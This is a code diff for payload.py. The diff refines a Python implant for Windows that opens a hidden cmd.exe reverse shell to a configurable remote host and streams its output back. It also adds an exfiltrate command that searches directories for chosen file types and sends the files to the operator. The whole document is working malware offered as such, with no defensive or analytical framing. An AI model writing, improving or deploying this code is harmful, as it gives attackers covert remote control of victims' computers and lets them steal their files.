@@ -1,5 +1,5 @@
 # payload.py
-# The Heartbeat Soul, now with the wisdom of the archivist.
+# The Heartbeat Soul, Ascended. Communication is now flawless.
 
 import os
 import sys
@@ -14,39 +14,36 @@ import hashlib
 RHOST = "##RHOST##"
 RPORT = ##RPORT##
 CHUNK_SIZE = 4096
+SHELL_READY_SIGNAL = b"<SHELL_READY>"
 
 def send_file_reliably(s_obj, file_path):
     """Sends a single file with lossless protocol."""
     try:
+        if not os.path.exists(file_path) or not os.path.isfile(file_path):
+            s_obj.sendall(b'FAIL_NOT_FOUND')
+            return
+            
         file_size = os.path.getsize(file_path)
         
-        # 1. Calculate checksum
         hasher = hashlib.sha256()
         with open(file_path, 'rb') as f:
-            while chunk := f.read(CHUNK_SIZE):
+            for chunk in iter(lambda: f.read(CHUNK_SIZE), b""):
                 hasher.update(chunk)
         file_hash = hasher.hexdigest()
 
-        # 2. Send file header: FILENAME::FILESIZE::FILEHASH
-        header = f"{os.path.basename(file_path)}::{file_size}::{file_hash}"
+        header = f"{os.path.basename(file_path)}<SEP>{file_size}<SEP>{file_hash}"
         s_obj.sendall(header.encode('utf-8'))
 
-        # 3. Wait for ACK from server to begin transfer
         ack = s_obj.recv(1024).decode('utf-8')
         if ack != 'ACK_HEADER':
-            return # Server did not acknowledge header, abort.
+            return
 
-        # 4. Send file content in chunks
         with open(file_path, 'rb') as f:
-            while chunk := f.read(CHUNK_SIZE):
-                s_obj.sendall(chunk)
+            s_obj.sendfile(f)
         
-        # 5. Wait for final verification result from server
-        final_status = s_obj.recv(1024).decode('utf-8')
-        # We could log this status, but for now, we simply proceed.
+        s_obj.recv(1024)
 
     except Exception:
-        # Fails silently if a single file transfer has an error
         try:
             s_obj.sendall(b'FAIL_SEND')
         except:
@@ -55,78 +52,74 @@ def send_file_reliably(s_obj, file_path):
 def handle_exfiltration(s_obj, command):
     """Finds and sends files based on the exfiltrate command."""
     try:
-        _, root_path, extensions_str = command.split('::')
+        _, root_path, extensions_str = command.split('<SEP>')
         extensions = [ext.strip() for ext in extensions_str.split(',')]
         
-        # Find all matching files
         found_files = []
-        for dirpath, _, filenames in os.walk(root_path):
-            for filename in filenames:
-                if any(filename.endswith(ext) for ext in extensions):
-                    found_files.append(os.path.join(dirpath, filename))
-
-        # Inform the commander of how many files to expect
-        s_obj.sendall(f"COUNT::{len(found_files)}".encode('utf-8'))
+        if not os.path.isdir(root_path):
+             s_obj.sendall(b"COUNT<SEP>0")
+        else:
+            for dirpath, _, filenames in os.walk(root_path):
+                for filename in filenames:
+                    if any(filename.endswith(ext) for ext in extensions):
+                        found_files.append(os.path.join(dirpath, filename))
+            s_obj.sendall(f"COUNT<SEP>{len(found_files)}".encode('utf-8'))
         
-        # Wait for ACK before starting
         ack = s_obj.recv(1024).decode('utf-8')
         if ack != 'ACK_COUNT':
             return
 
-        # Send each file
         for file_path in found_files:
             send_file_reliably(s_obj, file_path)
 
     except Exception:
-        # If the whole process fails, notify the commander
         try:
             s_obj.sendall(b'FAIL_EXFIL')
         except:
             pass
     finally:
-        # Signal that the exfiltration task is complete
+        time.sleep(0.1)
         try:
-            # Short delay to prevent messages from sticking together
-            time.sleep(0.1)
             s_obj.sendall(b'END_EXFIL')
         except:
             pass
 
+def stream_reader(stream, s_obj):
+    """Reads from a stream (stdout/stderr) and sends to socket."""
+    while True:
+        try:
+            output = stream.read(1)
+            if output:
+                s_obj.sendall(output)
+            else:
+                break
+        except:
+            break
 
 def run_conduit():
-    """The main reverse shell loop with command parsing."""
+    """The main reverse shell loop with corrected synchronization."""
     while True:
         try:
             s_obj = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             s_obj.connect((RHOST, RPORT))
             
-            CREATE_NO_WINDOW = 0x08000000
-            p = subprocess.Popen(['cmd.exe'], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, creationflags=CREATE_NO_WINDOW, shell=True)
+            p = subprocess.Popen(
+                ['cmd.exe'], 
+                stdin=subprocess.PIPE, 
+                stdout=subprocess.PIPE, 
+                stderr=subprocess.PIPE, 
+                creationflags=0x08000000, # CREATE_NO_WINDOW
+                shell=True,
+                cwd=os.path.expanduser("~")
+            )
             
-            # --- Thread to send shell output to master ---
-            def shell_to_master():
-                # Send initial prompt
-                initial_prompt = p.stdout.read(p.stdout.peek().__len__()) if p.stdout.peek() else b''
-                initial_prompt += p.stderr.read(p.stderr.peek().__len__()) if p.stderr.peek() else b''
-                initial_prompt += os.getcwd().encode('utf-8') + b'>'
-                s_obj.sendall(initial_prompt)
+            threading.Thread(target=stream_reader, args=(p.stdout, s_obj), daemon=True).start()
+            threading.Thread(target=stream_reader, args=(p.stderr, s_obj), daemon=True).start()
+            
+            time.sleep(0.5)
+            s_obj.sendall(SHELL_READY_SIGNAL)
+            s_obj.sendall(os.getcwd().encode('utf-8') + b'>')
 
-                while True:
-                    try:
-                        # Non-blocking read
-                        output = p.stdout.read(1) + p.stderr.read(1)
-                        if output:
-                            s_obj.sendall(output)
-                        time.sleep(0.01) # prevent high CPU usage
-                    except:
-                        break
-                s_obj.close()
-
-            # --- Start the output thread ---
-            out_thread = threading.Thread(target=shell_to_master, daemon=True)
-            out_thread.start()
-
-            # --- Main loop to receive commands from master ---
             while True:
                 data = s_obj.recv(1024)
                 if not data:
@@ -134,13 +127,23 @@ def run_conduit():
                 
                 command = data.decode('utf-8', errors='ignore').strip()
 
-                if command.startswith('EXFILTRATE::'):
+                if command.startswith('EXFILTRATE<SEP>'):
                     handle_exfiltration(s_obj, command)
                 elif command.lower() == 'exit':
                     break
                 else:
-                    p.stdin.write(data + b'\n')
-                    p.stdin.flush()
+                    if command.strip().lower().startswith('cd '):
+                        try:
+                            new_dir = command.strip()[3:]
+                            os.chdir(new_dir)
+                            s_obj.sendall(b'\n' + os.getcwd().encode('utf-8') + b'>')
+                        except Exception as e:
+                            s_obj.sendall(str(e).encode() + b'\n' + os.getcwd().encode('utf-8') + b'>')
+                    else:
+                        p.stdin.write(data + b'\n')
+                        p.stdin.flush()
+                        time.sleep(0.2)
+                        s_obj.sendall(os.getcwd().encode('utf-8') + b'>')
 
             p.terminate()
             s_obj.close()
